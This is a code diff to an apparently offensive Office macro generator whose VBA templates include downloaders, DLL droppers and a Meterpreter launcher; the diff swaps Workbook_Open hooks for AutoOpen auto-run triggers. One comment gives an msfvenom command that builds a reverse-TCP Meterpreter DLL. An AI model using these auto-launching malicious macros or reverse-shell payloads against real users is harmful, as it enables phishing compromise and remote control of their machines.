@@ -7,15 +7,11 @@ Private Sub Hello()
     MsgBox "Hello from <<<TEMPLATE>>>" & vbCrLf & "Remember to always be careful when you enable MS Office macros." & vbCrLf & "Have a nice day!"
 End Sub
 
-' triggered when Word/PowerPoint generator is used 
+' Auto launch when VBA enabled
 Sub AutoOpen()
     Hello
 End Sub
 
-' triggered when Excel generator is used
-Sub Workbook_Open()
-    Hello
-End Sub
 """
 
 DROPPER = \
@@ -51,10 +47,8 @@ Private Sub DownloadAndExecute()
     
 End Sub
 
+' Auto launch when VBA enabled
 Sub AutoOpen()
-    DownloadAndExecute
-End Sub
-Sub Workbook_Open()
     DownloadAndExecute
 End Sub
 """
@@ -98,11 +92,8 @@ Private Sub DownloadAndExecute()
     
 End Sub
 
-
+' Auto launch when VBA enabled
 Sub AutoOpen()
-    DownloadAndExecute
-End Sub
-Sub Workbook_Open()
     DownloadAndExecute
 End Sub
 """
@@ -114,11 +105,8 @@ r"""
 ' Thx to https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279
 ' And https://github.com/p3nt4/PowerShdll
 
+' Auto launch when VBA enabled
 Sub AutoOpen()
-    Debugging
-End Sub
-
-Sub Workbook_Open()
     Debugging
 End Sub
 
@@ -173,11 +161,8 @@ r"""
 ' Inspired by great work at: https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/
 ' Test with msfvenom.bat  -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f dll -o meter.dll
 
+' Auto launch when VBA enabled
 Sub AutoOpen()
-    DropRunDll
-End Sub
-
-Sub Workbook_Open()
     DropRunDll
 End Sub
 
@@ -248,10 +233,8 @@ r"""
 Const RHOST As String = "<<<TEMPLATE>>>"
 Const RPORT As String = "<<<TEMPLATE>>>"
 
+' Auto launch when VBA enabled
 Sub AutoOpen()
-    MacroMeter
-End Sub
-Sub Workbook_Open()
     MacroMeter
 End Sub
 
@@ -516,14 +499,11 @@ End Sub
 
 <<<STRINGS>>>
 
-
+' Auto launch when VBA enabled
 Sub AutoOpen()
     DecodeExec
 End Sub
 
-Sub Workbook_Open()
-    DecodeExec
-End Sub
 """
 
 
@@ -532,10 +512,7 @@ r"""
 
 Dim serverUrl As String
 
-' Auto generate at startup
-Sub Workbook_Open()
-    Main
-End Sub
+' Auto launch when VBA enabled
 Sub AutoOpen()
     Main
 End Sub
